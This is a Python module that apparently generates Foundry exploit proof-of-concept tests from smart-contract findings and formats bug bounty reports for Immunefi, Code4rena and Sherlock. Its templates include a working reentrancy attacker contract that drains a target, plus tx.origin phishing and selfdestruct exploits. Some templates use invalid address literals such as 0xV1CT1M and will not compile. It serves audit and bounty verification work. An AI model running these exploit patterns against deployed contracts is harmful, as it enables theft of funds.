# ruff: noqa: BLE001
"""Foundry-based PoC generator — creates exploit test scripts from vulnerability findings.

Takes a vulnerability finding (reentrancy, access control bypass, integer overflow, etc.)
and generates a minimal Foundry test that reproduces the exploit. The test can then be
run against a local fork to verify impact.

Usage:
    from whitemagic.tools.security.poc_generator import generate_exploit_poc
    code = generate_exploit_poc(
        vuln_type="reentrancy",
        contract_name="VulnerableVault",
        target_address="0x1234...",
        description="The withdraw function sends ETH before updating balance",
    )
"""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class ExploitPoC:
    """Generated exploit PoC result."""
    success: bool
    vuln_type: str
    contract_name: str
    test_code: str
    test_file: str = ""
    error: str = ""


# ── Vulnerability Templates ──────────────────────────────────────────

_TEMPLATES: dict[str, str] = {
    "reentrancy": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Reentrancy exploit for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function sends ETH before updating state,
// allowing a malicious contract to re-enter and drain funds.

contract AttackerContract {{
    {contract_name} public target;
    address public owner;

    constructor({contract_name} _target) {{
        target = _target;
        owner = msg.sender;
    }}

    receive() external payable {{
        // Re-enter if target still has funds
        if (address(target).balance >= msg.value) {{
            target.{function_name}();
        }}
    }}

    function attack() external payable {{
        // Initial call to trigger the vulnerable function
        target.{function_name}{{value: msg.value}}();
        // Withdraw stolen funds
        payable(owner).transfer(address(this).balance);
    }}
}}

contract PoC_Reentrancy_{timestamp} is Test {{
    {contract_name} target;

    function setUp() public {{
        // Deploy the vulnerable contract
        target = new {contract_name}();
        // Fund it with some ETH
        vm.deal(address(target), 10 ether);
    }}

    function test_reentrancy_exploit() public {{
        uint256 initialBalance = address(target).balance;
        assertEq(initialBalance, 10 ether, "Target should start with 10 ETH");

        // Deploy attacker
        AttackerContract attacker = new AttackerContract(target);
        vm.deal(address(attacker), 1 ether);

        // Attack
        attacker.attack{{value: 1 ether}}();

        // Verify: target should be drained
        assertEq(address(target).balance, 0, "Target should be drained after reentrancy attack");
        assertGt(address(attacker).balance, 1 ether, "Attacker should have profited");

        emit log_string("Reentrancy exploit successful — target drained");
    }}
}}
''',

    "access_control": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Access Control bypass for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function lacks proper access control,
// allowing any caller to execute privileged operations.

contract PoC_AccessControl_{timestamp} is Test {{
    {contract_name} target;
    address attacker = address(0xBAD);

    function setUp() public {{
        target = new {contract_name}();
        vm.label(address(target), "Target");
        vm.label(attacker, "Attacker");
    }}

    function test_access_control_bypass() public {{
        // Start prank as unauthorized user
        vm.startPrank(attacker);

        // Attempt to call the privileged function
        target.{function_name}();

        vm.stopPrank();

        // Verify the unauthorized action succeeded
        // TODO: Add specific assertion based on what {function_name} does
        emit log_string("Access control bypass successful — unauthorized call succeeded");
    }}
}}
''',

    "integer_overflow": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Integer overflow/underflow for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function performs arithmetic without
// safe math checks, allowing overflow/underflow to corrupt state.

contract PoC_IntegerOverflow_{timestamp} is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_integer_overflow() public {{
        // TODO: Set up initial state
        // target.deposit(1 ether);

        // Trigger the overflow
        vm.expectRevert(); // In Solidity >=0.8.0, overflow reverts by default
        target.{function_name}();

        // If the contract uses unchecked blocks or Solidity <0.8.0,
        // the overflow won't revert — adjust the test accordingly.

        emit log_string("Integer overflow test executed");
    }}
}}
''',

    "unchecked_external_call": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Unchecked external call for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function makes an external call
// without checking the return value, allowing silent failures.

contract PoC_UncheckedCall_{timestamp} is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_unchecked_external_call() public {{
        // Deploy a mock that always returns false on calls
        // This simulates a failed external call that goes unchecked

        // TODO: Replace the external dependency with a mock
        // that returns false, then verify the target doesn't revert
        // but should have detected the failure.

        emit log_string("Unchecked external call test setup — replace mock target");
    }}
}}
''',

    "front_running": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Front-running / MEV susceptibility for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function is susceptible to front-running
// because it doesn't use commit-reveal or slippage protection.

contract PoC_FrontRunning_{timestamp} is Test {{
    {contract_name} target;
    address victim = address(0xV1CT1M);
    address frontrunner = address(0xFR0NT);

    function setUp() public {{
        target = new {contract_name}();
        vm.deal(victim, 10 ether);
        vm.deal(frontrunner, 10 ether);
    }}

    function test_front_running() public {{
        // 1. Victim submits a transaction (e.g., swap)
        vm.startPrank(victim);
        // target.swap{{value: 1 ether}}(...);
        vm.stopPrank();

        // 2. Frontrunner sees the pending tx and submits first
        vm.startPrank(frontrunner);
        // target.swap{{value: 1 ether}}(...);  // Better price
        vm.stopPrank();

        // 3. Victim's tx executes at worse price
        // Verify victim lost value due to front-running

        emit log_string("Front-running test setup — configure swap parameters");
    }}
}}
''',

    "tx_origin": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: tx.origin authentication bypass for {contract_name}
// {description}
//
// Vulnerability: The {function_name} function uses tx.origin for authentication
// instead of msg.sender, allowing phishing attacks.

contract PhishingContract {{
    {contract_name} public target;

    constructor({contract_name} _target) {{
        target = _target;
    }}

    function phishing() external {{
        // When a user calls this, tx.origin is the user's address
        // so the target thinks the user authorized the action
        target.{function_name}();
    }}
}}

contract PoC_TxOrigin_{timestamp} is Test {{
    {contract_name} target;
    address victim = address(0xV1CT1M);

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_tx_origin_phishing() public {{
        // User interacts with phishing contract
        vm.startPrank(victim);
        PhishingContract phisher = new PhishingContract(target);
        phisher.phishing();
        vm.stopPrank();

        // Verify: the privileged action was executed via phishing
        emit log_string("tx.origin phishing exploit successful");
    }}
}}
''',

    "selfdestruct": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Self-destruct vulnerability for {contract_name}
// {description}
//
// Vulnerability: The contract can be self-destructed by an unauthorized party
// or at an unexpected time, sending ETH to any address.

contract PoC_SelfDestruct_{timestamp} is Test {{
    {contract_name} target;
    address attacker = address(0xBAD);

    function setUp() public {{
        target = new {contract_name}();
        vm.deal(address(target), 5 ether);
    }}

    function test_self_destruct() public {{
        uint256 attackerBalanceBefore = attacker.balance;

        // Trigger self-destruct (adjust function name)
        vm.prank(attacker);
        target.{function_name}();

        // Verify: ETH was sent to attacker via self-destruct
        assertGt(attacker.balance, attackerBalanceBefore, "Attacker should receive ETH");
        assertEq(address(target).balance, 0, "Target balance should be 0");

        emit log_string("Self-destruct exploit successful");
    }}
}}
''',

    "generic": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// PoC: Generic exploit for {contract_name}
// {description}
//
// Vulnerability type: {vuln_type}
// Target function: {function_name}

contract PoC_Generic_{timestamp} is Test {{
    {contract_name} target;

    function setUp() public {{
        // Deploy the target contract
        target = new {contract_name}();

        // TODO: Set up initial state — fund contracts, mint tokens, etc.
        // vm.deal(address(target), 10 ether);
    }}

    function test_exploit() public {{
        // TODO: Implement the exploit steps
        // 1. Set up preconditions
        // 2. Trigger the vulnerable function
        // 3. Assert the exploit succeeded

        // Example:
        // vm.startPrank(attacker);
        // target.{function_name}();
        // vm.stopPrank();
        // assertEq(expectedValue, actualValue, "Exploit should succeed");

        emit log_string("Generic PoC template — fill in exploit steps");
    }}
}}
''',
}


# ── Severity-based impact assessment ─────────────────────────────────

_SEVERITY_IMPACT: dict[str, str] = {
    "critical": "Funds can be stolen directly. Immediate exploitation possible.",
    "high": "Significant fund loss or protocol corruption under specific conditions.",
    "medium": "Limited fund loss, griefing, or state corruption requiring specific conditions.",
    "low": "Minor issues — information leakage, gas inefficiency, or edge-case bugs.",
    "informational": "Code quality issues, best practice violations, no direct exploit.",
}


# ── Report generator ─────────────────────────────────────────────────


def generate_bounty_report(
    title: str,
    severity: str,
    description: str,
    impact: str,
    proof_of_concept: str,
    mitigation: str,
    platform: str = "immunefi",
) -> str:
    """Generate a professional bounty submission report.

    Formats findings for specific platform requirements.
    """
    severity_lower = severity.lower()
    impact_text = impact or _SEVERITY_IMPACT.get(severity_lower, "")

    if platform == "immunefi":
        return _format_immunefi_report(
            title, severity, description, impact_text, proof_of_concept, mitigation
        )
    elif platform in ("code4rena", "c4"):
        return _format_c4_report(
            title, severity, description, impact_text, proof_of_concept, mitigation
        )
    elif platform == "sherlock":
        return _format_sherlock_report(
            title, severity, description, impact_text, proof_of_concept, mitigation
        )
    else:
        return _format_generic_report(
            title, severity, description, impact_text, proof_of_concept, mitigation
        )


def _format_immunefi_report(
    title: str, severity: str, description: str, impact: str, poc: str, mitigation: str
) -> str:
    return f"""## {title}

### Severity
{severity.upper()}

### Summary
{description}

### Vulnerability Detail
{description}

### Impact
{impact}

### Proof of Concept
```solidity
{poc}
```

### Recommendation
{mitigation}

### References
- [Immunefi Vulnerability Severity Classification](https://immunefi.com/severity-updates/)
- [Smart Contract Security Verification Standard](https://immunefi.com/scsvs/)
"""


def _format_c4_report(
    title: str, severity: str, description: str, impact: str, poc: str, mitigation: str
) -> str:
    return f"""# {title}

## Impact
{impact}

## Proof of Concept
```solidity
{poc}
```

## Tools Used
- Slither (static analysis)
- Foundry (PoC verification)
- Manual review

## Recommended Mitigation Steps
{mitigation}
"""


def _format_sherlock_report(
    title: str, severity: str, description: str, impact: str, poc: str, mitigation: str
) -> str:
    return f"""## {title}

### Severity
{severity}

### Summary
{description}

### Vulnerability Detail
{description}

### Impact
{impact}

### Proof of Concept
{poc}

### Mitigation
{mitigation}
"""


def _format_generic_report(
    title: str, severity: str, description: str, impact: str, poc: str, mitigation: str
) -> str:
    return f"""# {title}

**Severity**: {severity}

**Description**: {description}

**Impact**: {impact}

**Proof of Concept**:
{poc}

**Mitigation**: {mitigation}
"""


# ── Main PoC generator ───────────────────────────────────────────────


def generate_exploit_poc(
    vuln_type: str,
    contract_name: str = "TargetContract",
    function_name: str = "vulnerableFunction",
    description: str = "",
    target_address: str = "",
    project_dir: str | None = None,
) -> ExploitPoC:
    """Generate a Foundry exploit PoC test from a vulnerability type.

    Args:
        vuln_type: Type of vulnerability (reentrancy, access_control, integer_overflow,
                   unchecked_external_call, front_running, tx_origin, selfdestruct, generic)
        contract_name: Name of the vulnerable Solidity contract
        function_name: Name of the vulnerable function
        description: Human-readable description of the vulnerability
        target_address: Optional deployed address to target (for fork testing)
        project_dir: Optional Foundry project directory to write the test file

    Returns:
        ExploitPoC with the generated Solidity test code
    """
    vuln_key = vuln_type.lower().replace("-", "_").replace(" ", "_")

    # Find matching template
    template = _TEMPLATES.get(vuln_key, _TEMPLATES["generic"])

    # Render template
    timestamp = int(time.time())
    code = template.format(
        contract_name=contract_name,
        function_name=function_name,
        description=description or f"{vuln_type} vulnerability in {contract_name}.{function_name}",
        vuln_type=vuln_type,
        timestamp=timestamp,
    )

    # Optionally write to project
    test_file = ""
    if project_dir:
        test_dir = Path(project_dir) / "test"
        test_dir.mkdir(parents=True, exist_ok=True)
        test_file = str(test_dir / f"PoC_{vuln_key}_{timestamp}.t.sol")
        Path(test_file).write_text(code)
        logger.info("PoC written to %s", test_file)

    return ExploitPoC(
        success=True,
        vuln_type=vuln_type,
        contract_name=contract_name,
        test_code=code,
        test_file=test_file,
    )


def generate_poc_from_finding(
    finding: dict[str, Any],
    project_dir: str | None = None,
) -> ExploitPoC:
    """Generate a PoC from a STRATA/Slither finding dict.

    Expected finding fields: title, severity, category, file, line, description, message
    """
    category = finding.get("category", "").lower()
    description = finding.get("description", finding.get("message", ""))
    title = finding.get("title", "")

    # Map STRATA/Slither categories to vuln types
    category_map = {
        "reentrancy": "reentrancy",
        "reentrancy-eth": "reentrancy",
        "reentrancy-no-eth": "reentrancy",
        "reentrancy-benign": "reentrancy",
        "access_control": "access_control",
        "access-control": "access_control",
        "arbitrary-send": "access_control",
        "tx_origin": "tx_origin",
        "dangerous-tx-origin": "tx_origin",
        "unchecked-lowlevel": "unchecked_external_call",
        "unchecked-send": "unchecked_external_call",
        "unchecked-transfer": "unchecked_external_call",
        "integer-overflow": "integer_overflow",
        "integer-underflow": "integer_overflow",
        "front-running": "front_running",
        "selfdestruct": "selfdestruct",
        "suicidal": "selfdestruct",
    }

    vuln_type = category_map.get(category, "generic")

    # Try to extract contract and function names from the finding
    contract_name = "TargetContract"
    function_name = "vulnerableFunction"

    # Parse from file path if available
    file_path = finding.get("file", "")
    if file_path:
        from pathlib import Path as P

        contract_name = P(file_path).stem

    # Parse from description/title
    if "." in title:
        parts = title.split(".")
        if len(parts) >= 2:
            contract_name = parts[0]
            function_name = parts[1].split("(")[0].strip()

    return generate_exploit_poc(
        vuln_type=vuln_type,
        contract_name=contract_name,
        function_name=function_name,
        description=f"{title}: {description}" if title else description,
        project_dir=project_dir,
    )


def list_vuln_types() -> list[str]:
    """List all supported vulnerability types for PoC generation."""
    return sorted(_TEMPLATES.keys())
